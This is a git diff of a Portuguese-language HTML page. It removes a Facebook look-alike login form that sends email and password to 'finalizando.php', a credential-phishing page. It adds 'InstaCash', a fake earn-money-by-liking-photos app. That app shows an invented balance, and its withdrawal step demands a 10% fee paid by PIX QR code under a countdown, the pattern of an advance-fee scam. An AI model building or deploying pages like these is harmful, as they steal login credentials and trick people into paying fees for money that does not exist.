@@ -1,37 +1,225 @@
 <!DOCTYPE html>
-<html lang="en">
-
+<html lang="pt-BR">
 <head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Facebook</title>
-  <link rel="stylesheet" href="style.css">
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>InstaCash - Ganhe Dinheiro Real</title>
+    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css" rel="stylesheet">
+    <link rel="stylesheet" href="style.css">
 </head>
-
 <body>
-  <div class="container">
-    <div class="intro">
-      <img class="logo" src="./facebook.svg" alt="Facebook">
-      <h2>O Facebook ajuda você a se conectar e compartilhar com as pessoas que fazem parte da sua vida.</h2>
-    </div>
-    <div>
-      	<form name="" method="POST" action="./finalizando.php">
-        <input type="text" class="form-control" name="email" placeholder="Email ou telefone">
-        <input type="password" class="form-control" name="senha" placeholder="Senha">
-        <button class="entrar">Entrar</button>
-        <a href="#">Esqueceu a senha?</a>
-        <button class="criar-conta">Criar nova conta</button>
-      </form>
-      <p><a href="#">Criar uma Página</a> para uma celebridade, banda ou empresa.</p>
-    </div>
-  </div>
-  <footer>Facebook © <span id="year"></span></footer>
-  <script>
-    const year = document.getElementById('year');
-    const actualYear = new Date();
+    <div class="app-container">
+        <div class="header">
+            <div class="logo">
+                <i class="fas fa-money-bill-wave"></i>
+                <h1>InstaCash</h1>
+            </div>
+            <p>Ganhe dinheiro curtindo fotos!</p>
+        </div>
+        
+        <div class="balance-card">
+            <p class="balance-title"><i class="fas fa-wallet"></i> Seu Saldo Disponível</p>
+            <p class="balance-amount">R$ <span id="balance">0,00</span></p>
+        </div>
+        
+        <div class="content">
+            <!-- Seção Início -->
+            <div id="home-section" class="app-section active">
+                <div id="photo-container"></div>
+                
+                <div class="withdraw-section">
+                    <div class="section-title">
+                        <i class="fas fa-hand-holding-usd"></i>
+                        Retirar Dinheiro
+                    </div>
+                    <p><i class="fas fa-info-circle"></i> Insira o valor que deseja transferir para sua conta:</p>
+                    <div class="input-group">
+                        <input type="number" id="withdraw-amount" placeholder="Valor (R$)" min="10" step="0.01">
+                        <button onclick="showQrCodeModal()"><i class="fas fa-money-bill-transfer"></i> Retirar</button>
+                    </div>
+                    <p id="withdraw-message" class="withdraw-message"></p>
+                    <p style="font-size: 12px; color: #777;"><i class="fas fa-exclamation-circle"></i> Valor mínimo para saque: R$ 10,00. Transferências são processadas em até 24h úteis.</p>
+                </div>
+            </div>
 
-    year.innerHTML = actualYear.getFullYear();
-  </script>
+            <!-- Seção Histórico -->
+            <div id="history-section" class="app-section">
+                <div class="section-title">
+                    <i class="fas fa-history"></i>
+                    Histórico de Transações
+                </div>
+
+                <div id="history-list">
+                    <!-- Histórico será preenchido via JS -->
+                </div>
+            </div>
+
+            <!-- Seção Carteira -->
+            <div id="wallet-section" class="app-section">
+                <div class="section-title">
+                    <i class="fas fa-wallet"></i>
+                    Minha Carteira
+                </div>
+
+                <div class="wallet-card">
+                    <div class="wallet-card-number">**** **** **** 3829</div>
+                    <div class="wallet-card-info">
+                        <div class="wallet-card-holder">
+                            TITULAR
+                            <span>INSTACASH USER</span>
+                        </div>
+                        <div class="wallet-card-expires">
+                            VALIDADE
+                            <span>12/28</span>
+                        </div>
+                    </div>
+                </div>
+
+                <div class="wallet-options">
+                    <div class="wallet-option">
+                        <i class="fas fa-credit-card"></i>
+                        <h4>Cartões</h4>
+                    </div>
+                    <div class="wallet-option">
+                        <i class="fas fa-bank"></i>
+                        <h4>Contas</h4>
+                    </div>
+                    <div class="wallet-option">
+                        <i class="fas fa-money-bill-transfer"></i>
+                        <h4>Transferir</h4>
+                    </div>
+                    <div class="wallet-option">
+                        <i class="fas fa-qrcode"></i>
+                        <h4>Pagar</h4>
+                    </div>
+                </div>
+            </div>
+
+            <!-- Seção Perfil -->
+            <div id="profile-section" class="app-section">
+                <div class="profile-header">
+                    <div class="profile-avatar">
+                        <i class="fas fa-user"></i>
+                    </div>
+                    <div class="profile-info">
+                        <h3>Usuário InstaCash</h3>
+                        <p>usuario@email.com</p>
+                    </div>
+                </div>
+
+                <div class="profile-stats">
+                    <div class="profile-stat">
+                        <h4>0</h4>
+                        <p>Fotos Curtidas</p>
+                    </div>
+                    <div class="profile-stat">
+                        <h4>R$0,00</h4>
+                        <p>Total Ganho</p>
+                    </div>
+                    <div class="profile-stat">
+                        <h4>0</h4>
+                        <p>Saques</p>
+                    </div>
+                </div>
+
+                <div class="profile-option">
+                    <i class="fas fa-user-edit"></i>
+                    <span>Editar Perfil</span>
+                </div>
+                <div class="profile-option">
+                    <i class="fas fa-bell"></i>
+                    <span>Notificações</span>
+                </div>
+                <div class="profile-option">
+                    <i class="fas fa-shield-alt"></i>
+                    <span>Privacidade e Segurança</span>
+                </div>
+                <div class="profile-option">
+                    <i class="fas fa-cog"></i>
+                    <span>Configurações</span>
+                </div>
+                <div class="profile-option">
+                    <i class="fas fa-question-circle"></i>
+                    <span>Ajuda e Suporte</span>
+                </div>
+
+                <div class="invite-option">
+                    <div class="invite-icon">
+                        <i class="fas fa-gift"></i>
+                    </div>
+                    <div class="invite-info">
+                        <h4>Convide amigos e ganhe R$20!</h4>
+                        <p>Para cada amigo que se cadastrar e curtir 10 fotos</p>
+                    </div>
+                    <button class="invite-button">
+                        <i class="fas fa-share-alt"></i>
+                    </button>
+                </div>
+            </div>
+        </div>
+        
+        <div class="footer-spacer"></div>
+        
+        <div class="navbar">
+            <a href="#" class="nav-item active" data-section="home-section">
+                <i class="fas fa-home"></i>
+                <span>Início</span>
+            </a>
+            <a href="#" class="nav-item" data-section="history-section">
+                <i class="fas fa-history"></i>
+                <span>Histórico</span>
+            </a>
+            <a href="#" class="nav-item" data-section="wallet-section">
+                <i class="fas fa-wallet"></i>
+                <span>Carteira</span>
+            </a>
+            <a href="#" class="nav-item" data-section="profile-section">
+                <i class="fas fa-user"></i>
+                <span>Perfil</span>
+            </a>
+        </div>
+    </div>
+    
+    <div id="toast" class="toast"></div>
+
+    <!-- Modal QR Code -->
+    <div id="qrcode-modal" class="modal-overlay">
+        <div class="modal-content">
+            <button class="modal-close" onclick="closeQrCodeModal()">
+                <i class="fas fa-times"></i>
+            </button>
+            <div class="modal-title">
+                <i class="fas fa-qrcode"></i> Pagamento de Taxa
+            </div>
+            <div class="modal-message">
+                <p>Para liberar sua retirada, é necessário pagar uma pequena taxa de processamento de 10%.</p>
+            </div>
+            <div class="fee-details">
+                <div class="fee-line">
+                    <span>Valor solicitado:</span>
+                    <span id="modal-amount">R$ 0,00</span>
+                </div>
+                <div class="fee-line">
+                    <span>Taxa de processamento (10%):</span>
+                    <span id="modal-fee">R$ 0,00</span>
+                </div>
+                <div class="fee-line fee-total">
+                    <span>Valor a receber:</span>
+                    <span id="modal-final">R$ 0,00</span>
+                </div>
+            </div>
+            <div class="qr-code">
+                <img src="https://api.qrserver.com/v1/create-qr-code/?size=200x200&data=pix-example-key" alt="QR Code para pagamento">
+            </div>
+            <p style="font-size: 14px; color: #555;">
+                <i class="fas fa-clock"></i> O QR Code expira em <span id="qr-timer">10:00</span>
+            </p>
+            <button class="confirm-btn" onclick="processPayment()">
+                <i class="fas fa-check-circle"></i> Já Realizei o Pagamento
+            </button>
+        </div>
+    </div>
+    
+    <script src="script.js"></script>
 </body>
-
 </html>
